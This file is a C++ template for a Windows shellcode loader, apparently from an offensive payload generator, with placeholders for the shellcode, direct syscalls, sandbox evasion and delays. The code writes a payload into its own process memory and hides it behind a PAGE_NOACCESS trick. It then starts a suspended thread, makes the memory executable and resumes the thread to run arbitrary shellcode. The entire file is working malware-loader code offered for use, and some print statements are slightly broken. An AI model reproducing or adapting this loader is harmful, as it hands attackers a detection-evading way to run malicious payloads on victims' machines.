#include <iostream>
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <tchar.h>
#include <winternl.h>

//####INCLUDE####

//####DEFINE####

//####CODE####


DWORD WINAPI esc_main(LPVOID lpParameter)
{
    DWORD dwSize;
    //HANDLE currentProcess;

    const unsigned char raw[] = ####SHELLCODE####;
    SIZE_T length = sizeof(raw);

    unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char)*length*2);
    memcpy(encoded, raw, length);
    //SIZE_T bytesWritten;

    //####CALL####
    unsigned char* decoded = encoded;


    //####SYSCALL####
    HANDLE hProc = GetCurrentProcess();
    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    HANDLE thandle = NULL;
    SIZE_T bytesWritten;
    SIZE_T pnew = length;


    NTSTATUS res = NtAllocateVirtualMemory(hProc, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (res != 0){
        printf("NtAllocateVirtualMemory FAILED to allocate memory in the current process, exiting: ", res);
        return 0;
    }
    else {
        printf("NtAllocateVirtualMemory allocated memory in the current process successfully.\n");
    }

    res = NtWriteVirtualMemory(hProc, base_addr, decoded, length, &bytesWritten);

    if (res != 0){
        printf("NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: ", res);
        return 0;
    }
    else{
        printf("NtWriteVirtualMemory wrote decoded payload to allocated memory successfully.\n");
    }

    res = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&length, PAGE_NOACCESS, &oldprotect);

    if (res != 0){
        printf("NtProtectVirtualMemory FAILED to modify permissions: ", res);
        return 0;
    }
    else{
        printf("NtProtectVirtualMemory modified permissions successfully.\n");
    }

    res = NtCreateThreadEx(&thandle, GENERIC_EXECUTE, NULL, hProc, base_addr, NULL, TRUE, 0, 0, 0, NULL);

    if (res != 0){
        printf("NtCreateThreadEx FAILED to create thread in current process: ", res);
        return 0;
    }
    else{
        printf("NtCreateThreadEx created thread in current process successfully.\n");
    }

    res = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&length, PAGE_EXECUTE_READ, &oldprotect);

    if (res != 0){
        printf("NtProtectVirtualMemory FAILED to modify permissions: ", res);
        return 0;
    }
    else{
        printf("NtProtectVirtualMemory modified permissions successfully.\n");
    }

    res = NtResumeThread(thandle, 0);

    if (res != 0){
        printf("NtResumeThread FAILED to resume created thread: ", res);
        return 0;
    }
    else{
        printf("NtResumeThread resumed created thread successfully.\n");
    }

    res = NewNtWaitForSingleObject(thandle, -1, NULL);   
    
    printf("[+] The shellcode finished with a return value: %08X\n", res);
    return 0;
}

int main()
{
    //####DELAY####
    //####SANDBOXEVASION####
    //####ARGS####

    esc_main(NULL);
}
